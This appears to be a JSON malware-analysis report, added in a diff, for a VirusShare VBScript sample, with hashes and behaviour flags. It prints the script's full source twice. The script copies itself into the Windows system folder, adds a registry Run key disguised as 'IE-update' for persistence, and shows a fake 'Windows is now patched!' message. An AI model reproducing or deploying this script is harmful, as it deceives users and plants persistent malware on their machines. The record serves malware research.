@@ -1,0 +1,67 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Call": "May call a DLL using Excel 4 Macros",
+            "CreateObject": "May create an OLE object",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "On Error Resume Next\n\ndim jupe\ndim dirsystem\ndim dirwin\ndim dirtemp\ndim eq \ndim ctr\ndim file\ndim vbscopy\ndim dow\nSet jupe = CreateObject(\"Scripting.FileSystemObject\")\nset file = jupe.OpenTextFile(WScript.ScriptFullname,1)\nvbscopy=file.ReadAll\neq=\"\" : ctr=0\n\nCall Init6\nMsgbox \"Windows is now patched!\",vbCritical ,\"Patch succesful\"\n\nSub Init6()\n On Error Resume Next\n\n Set dirsystem = jupe.GetSpecialFolder(1)\n Set dirwin    = jupe.GetSpecialFolder(0)\n Set c         = jupe.GetFile(WScript.ScriptFullName)\n Set dirtemp   = jupe.GetSpecialFolder(2)\n\n c.Copy(dirsystem&\"\\Derrick.vbs\")\n RegCreate \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\IE-update\",dirsystem&\"\\patch.vbs\"\nEnd Sub\n\nSub RegCreate(regkey,regvalue)\n Set regedit = CreateObject(\"WScript.Shell\")\n regedit.RegWrite regkey,regvalue\nend sub"
+    },
+    "filename": "VirusShare_6bf04b5009cf58b00d187f9d3dd9a5ea",
+    "filesize": 856,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "6bf04b5009cf58b00d187f9d3dd9a5ea",
+        "sha1": "7d9a67e7f1413f2646280e75b85adf37bbc2fd92",
+        "sha256": "8c78c1423630d3dadb914fa2cea3c7307487b162849ce81823afa026e2385f27"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error Resume Next",
+            "dim jupe",
+            "dim dirsystem",
+            "dim dirwin",
+            "dim dirtemp",
+            "dim eq ",
+            "dim ctr",
+            "dim file",
+            "dim vbscopy",
+            "dim dow",
+            "Set jupe = CreateObject(\"Scripting.FileSystemObject\")",
+            "set file = jupe.OpenTextFile(WScript.ScriptFullname,1)",
+            "vbscopy=file.ReadAll",
+            "eq=\"\" : ctr=0",
+            "Call Init6",
+            "Msgbox \"Windows is now patched!\",vbCritical ,\"Patch succesful\"",
+            "Sub Init6()",
+            " On Error Resume Next",
+            " Set dirsystem = jupe.GetSpecialFolder(1)",
+            " Set dirwin    = jupe.GetSpecialFolder(0)",
+            " Set c         = jupe.GetFile(WScript.ScriptFullName)",
+            " Set dirtemp   = jupe.GetSpecialFolder(2)",
+            " c.Copy(dirsystem&\"\\Derrick.vbs\")",
+            " RegCreate \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\IE-update\",dirsystem&\"\\patch.vbs\"",
+            "End Sub",
+            "Sub RegCreate(regkey,regvalue)",
+            " Set regedit = CreateObject(\"WScript.Shell\")",
+            " regedit.RegWrite regkey,regvalue",
+            "end sub"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.273544",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
